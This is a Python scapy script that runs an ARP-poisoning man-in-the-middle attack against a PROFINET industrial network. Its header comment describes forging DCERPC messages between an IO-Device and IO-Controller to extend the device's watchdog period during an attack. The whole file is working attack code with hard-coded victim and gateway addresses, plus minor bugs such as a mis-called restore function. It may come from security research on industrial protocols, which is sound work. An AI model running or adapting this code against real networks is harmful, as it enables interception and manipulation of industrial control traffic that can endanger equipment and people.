from scapy.all import *
import time

# from profinet_controller.protocol_machines.cpm.messages.pnio_ps import *
import scapy.all as scapy
from scapy.contrib.pnio import *
from scapy.contrib.pnio_dcp import *
from getmac import get_mac_address

scapy.load_contrib("pnio_dcp")
scapy.load_contrib("pnio")

# ---------------------------------------------------------------
# DESCRIPTION
# We want to forge the DCERPC-Communication between IO-Device and
# IO-Controller to forge the IP and NameOfStation Attributes
# of the DCERPC-Messages to manipulate the connection parameters.
# In particular we want to modify the watchdop/datahold factor to
# manipulate the IO-Device to have a longer watchdog-period, so we
# have better chances to make a successful attack and can loose
# a few packets during the attack.
# ---------------------------------------------------------------


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def spoof(target_ip, host_ip, target_mac):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)


def restore(target_ip, host_ip, target_mac, host_mac):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # crafting the restoring packet
    arp_response = scapy.ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac
    )
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)


if __name__ == "__main__":
    # victim ip address
    target = "192.168.1.40"
    # gateway ip address
    host = "192.168.1.10"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    _enable_linux_iproute()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, "00:1D:9C:C7:B0:11")
            # telling the `host` that we are the `target`
            spoof(host, target, "00:1D:9C:C7:B0:70")
            # sleep for one second
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
